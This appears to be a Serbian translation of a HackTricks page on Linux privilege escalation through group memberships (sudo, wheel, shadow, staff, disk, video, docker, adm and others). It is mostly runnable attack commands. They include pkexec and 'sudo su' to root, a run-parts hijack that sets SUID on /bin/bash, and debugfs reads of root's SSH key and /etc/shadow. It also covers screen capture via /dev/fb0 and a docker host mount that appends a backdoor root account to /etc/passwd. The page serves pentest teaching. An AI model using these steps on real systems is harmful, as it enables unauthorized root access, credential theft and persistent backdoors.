# Zanimljive grupe - Linux Privesc

{{#include ../../../banners/hacktricks-training.md}}

## Sudo/Admin grupe

### **PE - Method 1**

**Ponekad**, **po defaultu (ili zato što neki softver to zahteva)** u fajlu **/etc/sudoers** možete pronaći neke od ovih linija:
```bash
# Allow members of group sudo to execute any command
%sudo	ALL=(ALL:ALL) ALL

# Allow members of group admin to execute any command
%admin 	ALL=(ALL:ALL) ALL
```
Ovo znači da **svaki korisnik koji pripada grupi sudo ili admin može да izvrši bilo šta kao sudo**.

Ako je to slučaj, да biste **postали root, jednostavno можете izvršiti**:
```
sudo su
```
### PE - Metoda 2

Pronađi sve suid binarne datoteke i proveri da li postoji binarna datoteka **Pkexec**:
```bash
find / -perm -4000 2>/dev/null
```
Ako utvrdite da je **pkexec SUID binarni fajl** i da pripadate grupi **sudo** ili **admin**, verovatno možete izvršavati binarne fajlove kao sudo koristeći `pkexec`.\
Ovo je zato što su to obično grupe unutar **polkit policy**. Ova politika u suštini identifikuje koje grupe mogu koristiti `pkexec`. Proverite to sa:
```bash
cat /etc/polkit-1/localauthority.conf.d/*
```
Tamo ćete naći koje grupe imaju dozvolu da izvršavaju **pkexec**, a podrazumevano se u nekim Linux distribucijama pojavljuju grupe **sudo** i **admin**.

Da **biste postali root možete izvršiti**:
```bash
pkexec "/bin/sh" #You will be prompted for your user password
```
Ako pokušate da pokrenete **pkexec** i dobijete ovu **grešku**:
```bash
polkit-agent-helper-1: error response to PolicyKit daemon: GDBus.Error:org.freedesktop.PolicyKit1.Error.Failed: No session for cookie
==== AUTHENTICATION FAILED ===
Error executing command as another user: Not authorized
```
**Nije zato što nemaš dozvole već zato što nisi povezan bez GUI-a**. A postoji rešenje za ovaj problem ovde: [https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903](https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903). Potrebna su ti **2 različite ssh sesije**:
```bash:session1
echo $$ #Step1: Get current PID
pkexec "/bin/bash" #Step 3, execute pkexec
#Step 5, if correctly authenticate, you will have a root session
```

```bash:session2
pkttyagent --process <PID of session1> #Step 2, attach pkttyagent to session1
#Step 4, you will be asked in this session to authenticate to pkexec
```
## Wheel Group

**Ponekad**, **podrazumevano**, u fajlu **/etc/sudoers** možete pronaći ovu liniju:
```
%wheel	ALL=(ALL:ALL) ALL
```
Ovo znači da **bilo koji korisnik koji pripada grupi wheel može izvršavati bilo šta kao sudo**.

Ako je to slučaj, da biste **postali root, možete jednostavno izvršiti**:
```
sudo su
```
## Shadow grupa

Korisnici iz **grupe shadow** mogu **čitati** datoteku **/etc/shadow**:
```
-rw-r----- 1 root shadow 1824 Apr 26 19:10 /etc/shadow
```
Dakle, pročitaj fajl i pokušaj da **crack some hashes**.

Kratka napomena o zaključavanju pri trijaži hash-eva:
- Unosi sa `!` ili `*` obično ne dozvoljavaju interaktivnu prijavu lozinkom.
- `!hash` obično znači da je lozinka postavljena, a zatim zaključana.
- `*` obično znači da nikada nije postavljen validan hash lozinke.
- Ovo je korisno za klasifikaciju naloga čak i kada je direktna prijava onemogućena.

## Staff grupa

**staff**: Dozvoljava korisnicima da dodaju lokalne izmene sistema (`/usr/local`) bez potrebe za root privilegijama (imajte na umu da izvršni fajlovi u `/usr/local/bin` nalaze se u PATH promenljivoj svakog korisnika, i mogu prebrisati izvršne fajlove u `/bin` i `/usr/bin` sa istim imenom). Uporedite sa grupom "adm", koja je više vezana za monitoring/bezbednost. [\[source\]](https://wiki.debian.org/SystemGroups)

U Debian distribucijama, promenljiva `$PATH` pokazuje da će `/usr/local/` biti izvršavan sa najvećim prioritetom, bez obzira da li ste privilegovani korisnik ili ne.
```bash
$ echo $PATH
/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games

# echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```
Ako možemo hijack neke programe u `/usr/local`, lako možemo dobiti root.

Hijack `run-parts` programa je jednostavan način da se dobije root, jer će većina programa pokretati `run-parts` (npr. crontab ili prilikom ssh prijave).
```bash
$ cat /etc/crontab | grep run-parts
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.daily; }
47 6    * * 7   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.weekly; }
52 6    1 * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.monthly; }
```
ili kada se uspostavi nova ssh sesija.
```bash
$ pspy64
2024/02/01 22:02:08 CMD: UID=0     PID=1      | init [2]
2024/02/01 22:02:10 CMD: UID=0     PID=17883  | sshd: [accepted]
2024/02/01 22:02:10 CMD: UID=0     PID=17884  | sshd: [accepted]
2024/02/01 22:02:14 CMD: UID=0     PID=17886  | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new
2024/02/01 22:02:14 CMD: UID=0     PID=17887  | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new
2024/02/01 22:02:14 CMD: UID=0     PID=17888  | run-parts --lsbsysinit /etc/update-motd.d
2024/02/01 22:02:14 CMD: UID=0     PID=17889  | uname -rnsom
2024/02/01 22:02:14 CMD: UID=0     PID=17890  | sshd: mane [priv]
2024/02/01 22:02:15 CMD: UID=0     PID=17891  | -bash
```
**Exploit**
```bash
# 0x1 Add a run-parts script in /usr/local/bin/
$ vi /usr/local/bin/run-parts
#! /bin/bash
chmod 4777 /bin/bash

# 0x2 Don't forget to add a execute permission
$ chmod +x /usr/local/bin/run-parts

# 0x3 start a new ssh sesstion to trigger the run-parts program

# 0x4 check premission for `u+s`
$ ls -la /bin/bash
-rwsrwxrwx 1 root root 1099016 May 15  2017 /bin/bash

# 0x5 root it
$ /bin/bash -p
```
## Grupa diskova

Ova privilegija je gotovo **ekvivalentna root access**, jer možete pristupiti svim podacima na mašini.

Fajlovi:`/dev/sd[a-z][1-9]`
```bash
df -h #Find where "/" is mounted
debugfs /dev/sda1
debugfs: cd /root
debugfs: ls
debugfs: cat /root/.ssh/id_rsa
debugfs: cat /etc/shadow
```
Imajte na umu da korišćenjem debugfs možete takođe **pisati fajlove**. Na primer, da kopirate `/tmp/asd1.txt` u `/tmp/asd2.txt`, možete uraditi:
```bash
debugfs -w /dev/sda1
debugfs:  dump /tmp/asd1.txt /tmp/asd2.txt
```
Međutim, ako pokušate da **pišete fajlove u vlasništvu root-a** (kao što su `/etc/shadow` ili `/etc/passwd`), dobićete grešku "**Permission denied**".

## Video grupa

Korišćenjem komande `w` možete saznati **ko je prijavljen na sistem** i ona će prikazati izlaz sličan sledećem:
```bash
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
yossi    tty1                      22:16    5:13m  0.05s  0.04s -bash
moshe    pts/1    10.10.14.44      02:53   24:07   0.06s  0.06s /bin/bash
```
**tty1** znači da je korisnik **yossi fizički prijavljen** na terminal na mašini.

**video group** ima pristup za pregled izlaza ekrana. U suštini možete posmatrati sadržaj ekrana. Da biste to uradili, potrebno je da **uhvatite trenutnu sliku na ekranu** kao sirove podatke i saznate rezoluciju koju ekran koristi. Podaci ekrana mogu se sačuvati u `/dev/fb0`, a rezoluciju ovog ekrana možete pronaći u `/sys/class/graphics/fb0/virtual_size`
```bash
cat /dev/fb0 > /tmp/screen.raw
cat /sys/class/graphics/fb0/virtual_size
```
Da biste **otvorili** **raw image** možete koristiti **GIMP**, izaberite fajl **`screen.raw`** i kao tip fajla izaberite **Raw image data**:

![](<../../../images/image (463).png>)

Zatim izmenite Width i Height na vrednosti koje se koriste na ekranu i proverite različite Image Types (i izaberite onaj koji najbolje prikazuje ekran):

![](<../../../images/image (317).png>)

## Grupa root

Izgleda da po defaultu **članovi root grupe** mogu imati pristup da **izmenjuju** neke **service** konfiguracione fajlove ili neke fajlove **libraries** ili **druge zanimljive stvari** koje bi mogle biti iskorišćene za eskalaciju privilegija...

**Proverite koje fajlove članovi root grupe mogu izmeniti**:
```bash
find / -group root -perm -g=w 2>/dev/null
```
## Docker Group

Možete **montirati root filesystem host mašine na volume instance**, tako da kada se instance pokrene, odmah učitava `chroot` u taj volume. Ovo vam efektivno daje root na mašini.
```bash
docker image #Get images from the docker service

#Get a shell inside a docker container with access as root to the filesystem
docker run -it --rm -v /:/mnt <imagename> chroot /mnt bash
#If you want full access from the host, create a backdoor in the passwd file
echo 'toor:$1$.ZcF5ts0$i4k6rQYzeegUkacRCvfxC0:0:0:root:/root:/bin/sh' >> /etc/passwd

#Ifyou just want filesystem and network access you can startthe following container:
docker run --rm -it --pid=host --net=host --privileged -v /:/mnt <imagename> chroot /mnt bashbash
```
Na kraju, ako ti nijedna od prethodnih sugestija ne odgovara ili ne radi iz nekog razloga (docker api firewall?), uvek možeš pokušati da **run a privileged container and escape from it** kao što je objašnjeno ovde:


{{#ref}}
../container-security/
{{#endref}}

Ako imaš write permissions over the docker socket pročitaj [**this post about how to escalate privileges abusing the docker socket**](../index.html#writable-docker-socket)**.**


{{#ref}}
https://github.com/KrustyHack/docker-privilege-escalation
{{#endref}}


{{#ref}}
https://fosterelli.co/privilege-escalation-via-docker.html
{{#endref}}

## lxc/lxd Grupa


{{#ref}}
./
{{#endref}}

## Adm grupa

Obično **members** grupe **`adm`** imaju dozvole da **read log** fajlove koji se nalaze u _/var/log/_.\
Dakle, ako si kompromitovao korisnika koji je član ove grupe, svakako treba da pogledaš logove.

## Backup / Operator / lp / Mail grupe

Ove grupe su često **credential-discovery** vektori više nego direktni root vektori:
- **backup**: može otkriti arhive sa konfiguracijama, ključevima, DB dumpovima ili tokenima.
- **operator**: platform-specific operativni pristup koji može leak-ovati osetljive runtime podatke.
- **lp**: print queues/spools mogu sadržati sadržaj dokumenata.
- **mail**: mail spools mogu otkriti reset links, OTPs i interne kredencijale.

Smatraj članstvo ovde nalazom visokovredne izloženosti podataka i pivotiraj kroz password/token reuse.

## Auth grupa

U OpenBSD-u grupa **auth** obično može pisati u foldere _**/etc/skey**_ i _**/var/db/yubikey**_ ako se koriste.\
Ove dozvole se mogu zloupotrebiti pomoću sledećeg exploita da bi se **escalate privileges** do root-a: [https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot](https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot)

{{#include ../../../banners/hacktricks-training.md}}
